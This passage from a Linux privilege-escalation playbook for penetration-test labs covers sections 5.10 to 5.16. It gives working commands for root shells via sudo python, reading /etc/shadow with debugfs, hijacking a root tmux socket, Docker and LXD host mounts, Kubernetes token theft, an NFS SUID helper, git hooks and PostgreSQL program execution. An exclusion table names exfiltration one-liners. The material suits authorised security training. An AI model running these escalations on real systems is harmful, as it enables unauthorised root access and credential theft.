(`sudo python3 -c 'import os;os.setuid(0);os.execl("/bin/sh","sh","-p")'`) and no import hijack is
needed. Use the hijack only when the argument is a fixed script path.

### Variant — bare-name import in another user's job

`(rabbit) /usr/bin/python3.6 /home/<user>/script.py` importing `random` (or any module) is the
same bug: shadow the imported name in a directory that precedes the standard library for that job.
Success may be a transition to the job's user (e.g. `rabbit`), not root; re-enumerate from the new
identity.

## 5.10 Privileged groups, devices, logs, and tmux

### `disk` group → `debugfs` read

**Context:** membership in `disk` grants raw read of the block device via `debugfs`.

```bash
id | grep -o 'disk'
df -h                                  # identify the root device, e.g. /dev/sda1
debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null   # read-only probe
```

This is a raw-read primitive, not a shell. Read the minimum needed, keep any recovered hash
private, and route cracking to [§04](04-password-attacks.md). Do not write to the raw device.

### `adm` group → readable logs

Membership in `adm` lets you read system logs; treat it as a credential/context lead and use the
targeted searches in [§5.2](#52-credentials-source-and-staged-tools). It is not root by itself.

### Root `tmux` shared socket

**Context:** a root `tmux` server listens on a socket whose group you are in.

```bash
ps aux | grep '[t]mux'                 # tmux -S /shareds new -s debugsess
ls -la /shareds                        # srw-rw---- root <your-group>
id

tmux -S /shareds attach                # or: tmux -S /shareds
# Prove identity inside the session, then detach with Ctrl-b d.
```

Success is a shell in root's session. **Only attach and detach** — never kill the session or
delete the socket. The producer side (`tmux -S /shareds new ...; chown root:<grp> /shareds`) is
the lab setup, not the attack; you join an existing server.

## 5.11 Containers: LXD, Docker, and Kubernetes

### Indicators

```bash
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|lxc|kube'
grep -E 'Cap(Prm|Eff|Bnd):' /proc/self/status
ls -la /dev | wc -l                    # many devices ~ possibly privileged
findmnt                                 # host bind mounts of interest
```

Indicators suggest a container; they are not absolute proof, and container UID 0 is **not**
automatically host UID 0.

### Docker group (standard socket)

**Context:** your user is in the `docker` group (or can reach `/var/run/docker.sock`).

```bash
id                                     # groups=...,docker
docker image ls
docker run -v /:/mnt --rm -it <existing-image> chroot /mnt sh
```

Use an image that already exists locally; add `--pull=never` if needed. Read/prove on the host
mount and restore anything you touch. On Alpine the shell is `/bin/sh`, not `/bin/bash`.

### Custom / non-standard Docker socket

**Context:** a Docker API socket lives at a non-default path such as `~/app/docker.sock`.

```bash
ls -la ~/app/docker.sock
DOCKER_HOST=unix://$HOME/app/docker.sock docker ps
DOCKER_HOST=unix://$HOME/app/docker.sock docker run --rm -v /:/hostsystem \
  <existing-image> chroot /hostsystem /usr/bin/id
```

Prove host identity with `id`; do not read root keys by default. Use a locally staged `docker`
client rather than downloading one on the target.

### LXD / LXC

**Context:** membership in `lxd`/`lxc` allows a privileged container mounting the host.

```bash
lxc image list                         # use an already-imported image
lxc init <image> oscp -c security.privileged=true
lxc config device add oscp hostdisk disk source=/ path=/mnt/root recursive=true
lxc start oscp
lxc exec oscp -- /bin/sh               # Alpine: sh; Ubuntu template: bash
ls -l /mnt/root/root
lxc stop oscp && lxc delete oscp       # remove the container
```

Success is host-filesystem access under `/mnt/root`. Do not assume the shell or image format: an
Alpine builder artifact and an Ubuntu template differ. Remove the container and any image you
imported.

### Kubernetes

**Context:** a reachable API/Kubelet endpoint on a node you are authorised to test.

```bash
curl -sk https://<node>:6443/             # anonymous 403 = auth boundary, not RCE
curl -sk https://<node>:10250/pods | jq .  # read-only kubelet, if permitted
kubeletctl -i --server <node> pods
kubeletctl -i --server <node> exec "id" -p <pod> -c <container>   # UID 0 in-container only
```

If a service-account token is reachable, scope it before use:

```bash
TOKEN=$(kubeletctl --server <node> exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container>)
kubectl --token="$TOKEN" --certificate-authority=ca.crt \
  --server=https://<node>:6443 auth can-i --list
unset TOKEN
```

Only if RBAC allows pod creation, a disposable read-only `hostPath` pod demonstrates
node-filesystem reach:

```yaml
# read-only host mount; prove with a non-secret file, then delete the pod
spec:
  containers:
  - name: oscp
    image: <existing-image>
    volumeMounts: [{ mountPath: /host, name: h, readOnly: true }]
  volumes: [{ name: h, hostPath: { path: / } }]
```

Never log the token value, mount host root writable, or read root SSH keys as the proof; an
anonymous 403 proves only an endpoint/authz boundary. Delete any pod you create.

### Redis with a host bind mount (conditional)

If a reachable Redis runs in a container whose host bind mount is writable, prove host authority
**harmlessly** (write a non-secret marker to the mount and read it back). Do not write host cron,
keys, or sudoers. See the Redis lead in [§5.13](#513-application-specific-consumers).

## 5.12 NFS (`no_root_squash`)

### Decision tree

```text
111/2049 reachable? ── no ─> not exploitable from here
   │ yes
List exports (showmount -e / read /etc/exports)?
   │ yes
Mount an export as root?  ── no ─> not exploitable from here
   │ yes
Writable?                 ── no ─> read-only; SUID trick fails
   │ yes
Server keeps root ownership (no_root_squash)? ── no (root_squash) ─> fails
   │ yes
=> Vulnerable: build a root-owned SUID helper on the share
```

### Direct mount and SUID helper

**Context:** an export is `rw` with `no_root_squash`.

```bash
cat /etc/exports 2>/dev/null           # look for no_root_squash
showmount -e <TARGET_IP>               # from the attacker host
sudo mount -t nfs <TARGET_IP>:/<export> /mnt/nfs     # mount as root locally
```

Compile a root-owned SUID identity proof on the share, then run it on the target:

```c
// oscp-nfs.c
#include <stdlib.h>
#include <unistd.h>
int main(void){ setgid(0); setuid(0); execl("/usr/bin/id","id",NULL); }
```

```bash
# On the attacker host (root, inside the mount):
gcc -static -o /mnt/nfs/oscp-nfs oscp-nfs.c
chmod u+s /mnt/nfs/oscp-nfs
# On the target (low-priv shell):
/<export-mountpoint>/oscp-nfs          # runs as root -> id
rm -f /mnt/nfs/oscp-nfs                # remove the helper when done
```

Success is UID 0 on the target. Because the export is not `nosuid`, the set-ID bit survives the
round-trip. Do not leave a SUID shell behind.

### Blocked showmount → NFSv4 over a forward

If `showmount` is blocked, NFSv4 exposes only 2049 and can be reached through a single local
forward; the tunnel itself belongs in [§07](07-pivoting-and-tunneling.md):

```bash
ssh -L 1818:localhost:2049 <user>@<TARGET_IP> -i id_rsa   # transport → §07
sudo mount -o port=1818,vers=4 -t nfs localhost:/ /mnt/nfs
```

A single-port 2049 forward is normally NFSv4; NFSv3 additionally needs rpcbind/mountd and dynamic
ports. Keep UID mapping, root squashing, and mount flags here; keep tunnel mechanics in §07.

## 5.13 Application-specific consumers

### Logrotate / logrotten (race, gated)

**Context:** logrotate runs as root and you can write a rotated log or an included config.

```bash
grep -RIn -E '^(su |create|compress|postrotate|firstaction)' \
  /etc/logrotate.conf /etc/logrotate.d 2>/dev/null
cat /var/lib/logrotate.status 2>/dev/null
logrotate --version
namei -l <log-file> <log-parent>
```

A writable log alone is not execution. The logrotten race needs a vulnerable version (e.g.
3.8.6 / 3.11.0 / 3.15.0 / 3.18.0), a writable log directory, and precise timing right after a real
rotation; writable-log race/version paths go through the
[CVE gate](#514-kernel-and-platform-cves-last-resort). A writable **included config** is a direct
hook only with an exact backup, one natural trigger, an identity marker, and immediate restore.
Respect `su <user> <group>` and never force production rotation.

### Git hooks

**Context (sudo pre-commit):** `sudo -l` allows `git` with argument freedom.

```bash
TF=$(mktemp -d /tmp/oscp-git.XXXXXX)
git init "$TF"
printf '%s\n' '#!/bin/sh' '/usr/bin/id > /tmp/oscp-git.id' > "$TF/.git/hooks/pre-commit"
chmod 0755 "$TF/.git/hooks/pre-commit"
sudo /usr/bin/git -C "$TF" -c safe.directory="$TF" commit --allow-empty -m proof
cat /tmp/oscp-git.id
rm -rf -- "$TF" /tmp/oscp-git.id
```

**Context (scheduled post-commit):** a higher-identity user periodically commits in a repo whose
hooks you can write (observe via pspy). Add one one-shot `post-commit` hook, wait for the natural
commit, read the marker, then remove the hook. Do not overwrite an existing hook or package
another user's `.git`; success may be that user's identity, not root. Confirm argument freedom and
`safe.directory`/`NOEXEC` gates and do not weaken global Git config to force it. The sudo Git
**pager** variant is in [§5.3](#53-sudo-and-delegated-execution).

### PostgreSQL `COPY ... FROM PROGRAM`

**Context:** you hold a PostgreSQL superuser (or `pg_execute_server_program`) role.

```sql
SELECT current_user, rolsuper FROM pg_roles WHERE rolname = current_user;
CREATE TEMP TABLE oscp(out text);
COPY oscp FROM PROGRAM '/usr/bin/id';
TABLE oscp;
DROP TABLE oscp;
```

Success is command execution as the database OS user (usually `postgres`, **not** root). Record
the identity, drop the proof table, and re-enumerate from there.

### Redis (conditional local-service lead)

**Context:** a local Redis daemon you can reach; establish identity and mapping before anything
else.

```bash
ps -eo user,pid,args | grep '[r]edis-server'
ss -ltnp 2>/dev/null | grep 127.0.0.1:6379
redis-cli -h 127.0.0.1 ACL WHOAMI
redis-cli -h 127.0.0.1 CONFIG GET dir
redis-cli -h 127.0.0.1 CONFIG GET dbfilename
```

Prove daemon identity, ACL, and filesystem mapping, then require a real higher-identity consumer.
Route a webroot write to [§02](02-web-attacks.md) (usually the web user, not root); route a
container host mount to [§5.11](#511-containers-lxd-docker-and-kubernetes). Do not use
`CONFIG SET dir` to write cron/`authorized_keys`, replication, or downloaded modules as a default
proof.

### Legitimate `pkexec` vs. a CVE

`pkexec -u root id` prompting for authentication (or denying you) is normal PolicyKit behaviour,
**not** a vulnerability. PwnKit (CVE-2021-4034) and similar are version-specific and belong behind
the [CVE gate](#514-kernel-and-platform-cves-last-resort).

## 5.14 Kernel and platform CVEs (last resort)

Only after configuration paths are exhausted. A version string is **not** qualification: vendor
backports, architecture, kernel config (`CONFIG_USER_NS`, `CONFIG_NF_TABLES`,
`unprivileged_userns_clone`), and mitigations decide exploitability. Stage reviewed source in a
**disposable** lab; a suggester hit is not authorisation to run a PoC.

```bash
uname -mrs; cat /etc/os-release; cat /proc/version
dpkg-query -W 'linux-image*' sudo policykit-1 2>/dev/null
rpm -q kernel sudo polkit 2>/dev/null
grep -E 'CONFIG_(USER_NS|NF_TABLES|BPF_SYSCALL)=' /boot/config-"$(uname -r)" 2>/dev/null
sysctl kernel.unprivileged_userns_clone kernel.unprivileged_bpf_disabled 2>/dev/null
```

| Family / CVE | Gate to confirm before staging |
|---|---|
| sudo Baron Samedit (CVE-2021-3156) | affected vendor sudo package/backport; reviewed source |
| sudo `-u#-1` (CVE-2019-14287) | affected build + a `(ALL,!root)`-style RunAs rule (see [§5.3](#53-sudo-and-delegated-execution)) |
| PolicyKit PwnKit (CVE-2021-4034) | polkit `pkexec` version; reviewed source, no default download-run |
| GNU Screen 4.5.0 set-ID | exact set-ID Screen build; writable `ld.so.preload` path |
| Dirty Pipe (CVE-2022-0847) | vendor kernel actually in the 5.8–5.17 range, not just `uname` |
| Netfilter CVE-2021-22555 | `CONFIG_NF_TABLES`, userns, architecture (`-m32 -static`) |
| Netfilter CVE-2022-25636 | vendor kernel/config qualification |
| Netfilter CVE-2023-32233 | vendor/config; needs `libmnl`/`libnftnl` |

**Compiler troubleshooting (DirtyCow etc.):** `gcc: error trying to exec 'cc1'` is a toolchain
gap, not exploit evidence. Resolve it correctly, never through a privileged PATH or opaque
download:

```bash
CC1=$(gcc -print-prog-name=cc1); printf 'cc1=%s\n' "$CC1"
test -x "$CC1" && file "$CC1"
gcc -pthread <exploit>.c -o oscp-poc -lcrypt   # only in a disposable lab
```

Do not rely on a hard-coded GCC-version path; static linking is not mandatory and may lack local
libraries.

## 5.15 Routes, stops, and corrected old notes

### Route instead of duplicate

| Observation | Route |
|---|---|
| Restricted shell (`rbash`/`rksh`/`rzsh`) escape | [§03](03-shells-and-payloads.md); capability may change while identity does not |
| New interface/route, tunnels, port forwards | [§07](07-pivoting-and-tunneling.md) |
| Candidate passwords/hashes/keys | [§04](04-password-attacks.md) |
| File movement / staging | [§09](09-file-transfers.md) |
| Post-root loot, flags, history mining | [§10](10-post-exploitation-and-loot.md) |

```bash
# Restricted-shell orientation before routing to §03:
id; printf 'SHELL=%s\n' "$SHELL"
ps -o pid,ppid,user,args -p $$ -p "$PPID"
command -V sh bash python3 perl vi less 2>/dev/null
```

### Excluded from the local core (persistence / exfiltration)

These stay out of `05` as runnable recipes; keep only the finding severity and route the rest:

| Old note | Why excluded |
|---|---|
| Append UID-0 line to `/etc/passwd`; write `authorized_keys`; sudoers/PAM edit; root cron/systemd install | persistence and auth-control damage — never used as proof |
| `wget --post-file=<secret>`; `hping3 --file=<key>`; `sudo hping3` arbitrary read | protected-read + outbound exfiltration |
| `aria2c` overwrite of `/etc/passwd` | no proven privileged consumer; external download + auth damage |
| Redis writing root cron | persistence + unproven filesystem/consumer assumptions |
| `crontab -r` | deletes the **entire** crontab — never a cleanup step; remove only your tagged entry |

**Corrections that must not regress:** a low-priv user cannot make their own binary root-SUID with
`chmod u+s`; a SUID bit on a `.py` script is not a privileged interpreter; an interactive
`export PATH=...` does not prove cron/systemd/sudo PATH; container UID 0 ≠ host root; a Kubernetes
anonymous 403 is a boundary, not exploitability; a version string alone never qualifies a CVE;
`find -name '*.txt'`, `git add --chmod`, and `curl -o /etc/passwd` are not the wildcard
primitives the old notes implied (see [§5.7](#57-wildcard-and-argument-injection)).

## 5.16 Verify and clean up

```bash
# 1. Baseline before, marker after — identity is the proof, not a flag.
id
cat <marker>                         # e.g. /tmp/oscp-*.id
stat <marker>

# 2. Exact cleanup only — name every artifact; never a broad wildcard.
rm -f -- <exact-option-filename> <exact-helper> <marker>
rmdir -- <empty-private-workdir> 2>/dev/null
test ! -e <exact-helper> && test ! -e <marker>
```

State the real identity boundary the marker shows: a container, database, or service identity is
not silently "host root". If the marker is another non-root user, re-run `id`, `sudo -l`,
`groups`, and process enumeration from that identity ([§5.1](#51-fast-pass)).

Leave nothing behind: no hooks, option-like filenames, modified application/config files, database
tables, Redis settings, logrotate entries, scheduled jobs, SUID files, containers, or listeners.
Restore any file you backed up to its exact original bytes. Do not use `crontab -r`, blanket
`chmod 777`, broad cleanup globs, or any persistence/authentication change as part of cleanup.
Hand off credentials to [§04](04-password-attacks.md), transport to
[§07](07-pivoting-and-tunneling.md), and loot to [§10](10-post-exploitation-and-loot.md).

## References

- [GTFOBins](https://gtfobins.github.io/) — per-binary sudo/SUID/capability functions; always
  match the exact function to the exact rule rather than the binary name alone.
- Chapter handoffs are linked inline: shells [§03](03-shells-and-payloads.md), passwords
  [§04](04-password-attacks.md), pivoting [§07](07-pivoting-and-tunneling.md), transfers
  [§09](09-file-transfers.md), loot [§10](10-post-exploitation-and-loot.md).
- Automated helpers (LinPEAS, LinEnum, LSE, linuxprivchecker, pspy, Lynis,
  linux-exploit-suggester) are staged from locally reviewed copies; every finding is re-verified
  manually (see [§5.2](#52-credentials-source-and-staged-tools)).
